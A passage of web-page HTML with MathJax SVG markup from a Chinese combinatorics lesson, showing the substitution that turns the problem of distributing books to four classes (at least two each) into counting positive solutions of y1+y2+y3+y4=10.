3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(13440.7,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">）</text></g></g></g></svg></mjx-container>这样的解有多少个(x分别代表分给每个班书的数目)<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.312ex;" xmlns="http://www.w3.org/2000/svg" width="18.301ex" height="1.819ex" role="img" focusable="false" viewBox="0 -666 8089.1 804"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(1905.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(2683.3,0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"></path></g><g data-mml-node="mi" transform="translate(3961.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(4755.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(5755.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6533.3,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(7589.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>（使用条件）<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="21.361ex" height="2.161ex" role="img" focusable="false" viewBox="0 -750 9441.6 955"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">令</text></g><g data-mml-node="mi" transform="translate(1000,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1794.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2794.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3572.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(4628,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5118,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">（</text></g><g data-mml-node="mi" transform="translate(6118,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6885.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(7941.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(8441.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">）</text></g></g></g></svg></mjx-container></p></li></ul><p>方程等价为<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="37.55ex" height="1.971ex" role="img" focusable="false" viewBox="0 -666 16596.9 871"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1148.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2149,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2871.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(3871.4,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5020.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(6020.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6742.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(7742.9,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g><g data-mml-node="mo" transform="translate(8891.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(9891.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10614.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(11614.3,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g><g data-mml-node="mo" transform="translate(12763.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(13763.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(14541.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(15596.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container></p><p>化简得<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="20.831ex" height="1.971ex" role="img" focusable="false" viewBox="0 -666 9207.1 871"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1148.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(2149,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3297.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(4298,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5446.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(6447,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7651.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 